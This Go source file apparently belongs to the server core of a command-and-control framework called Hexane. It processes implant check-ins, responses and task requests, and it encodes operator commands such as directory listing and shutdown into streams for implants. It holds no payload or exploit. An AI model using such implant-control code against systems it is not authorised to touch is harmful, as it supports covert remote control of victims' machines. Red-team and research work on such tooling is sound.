package core

import (
	"fmt"
	"strings"
)

// todo: implement command front-end and back-end
// todo: implement implant multitasking

var (
	CommandMap = map[string]uint32{
		"dir":      CommandDir,
		"mods":     CommandMods,
		"shutdown": CommandShutdown,
	}
)

func (h *HexaneConfig) DispatchCommand(stream *Stream) {
	var (
		err error
		cmd []byte
	)

	if h.CommandChan != nil {
		for blob := range h.CommandChan {
			if cmd, err = h.ProcessCommand(blob); err != nil {
				WrapMessage("ERR", err.Error())
			}

			stream.PackBytes(cmd)
			WrapMessage("DBG", DbgPrintBytes(fmt.Sprintf("command sent to %d: ", h.PeerId), stream.Buffer))
		}
	} else {
		WrapMessage("ERR", "command channel is nil")
	}
}

func (h *HexaneConfig) ProcessParser(parser *Parser) ([]byte, error) {
	var stream *Stream

	switch parser.MsgType {
	case TypeCheckin:

		h.Active = true
		h.WriteChan.ParseTable(parser)
		h.CommandChan = make(chan string, 5)

		WrapMessage("DBG", fmt.Sprintf("checkin from: %d", parser.PeerId))

		if stream = h.CreateStreamWithHeaders(TypeCheckin); stream == nil {
			return nil, fmt.Errorf("stream returned nil")
		}

	case TypeResponse:

		h.WriteChan.ParseTable(parser)
		WrapMessage("DBG", fmt.Sprintf("response from: %d", parser.PeerId))

		if stream = h.CreateStreamWithHeaders(TypeTasking); stream == nil {
			return nil, fmt.Errorf("stream returned nil")
		}

		h.DispatchCommand(stream)

	case TypeTasking:

		WrapMessage("DBG", fmt.Sprintf("task request from: %d", parser.PeerId))

		if stream = h.CreateStreamWithHeaders(TypeTasking); stream == nil {
			return nil, fmt.Errorf("stream returned nil")
		}

		h.DispatchCommand(stream)

	default:
		return nil, fmt.Errorf("unknown msg type: %v", parser.MsgType)
	}

	WrapMessage("DBG", DbgPrintBytes("outgoing message: ", stream.Buffer))
	return stream.Buffer, nil
}

func (h *HexaneConfig) ProcessCommand(input string) ([]byte, error) {
	var (
		cmdType    uint32
		args       string
		argsBuffer []string
		stream     *Stream
	)

	stream = CreateStream()

	if input != "" {
		buffer := strings.Split(input, " ")
		cmd := buffer[0]

		argsBuffer = append(argsBuffer, buffer[1:]...)
		args = strings.Join(argsBuffer, " ")

		for k, v := range CommandMap {
			if strings.EqualFold(k, cmd) {
				cmdType = v
				break
			}
		}
		if cmdType == 0 {
			return nil, fmt.Errorf("unknown command: %s", input)
		}
	} else {
		cmdType = CommandNoJob
	}

	stream.PackDword(cmdType)
	stream.PackString(args)

	return stream.Buffer, nil
}
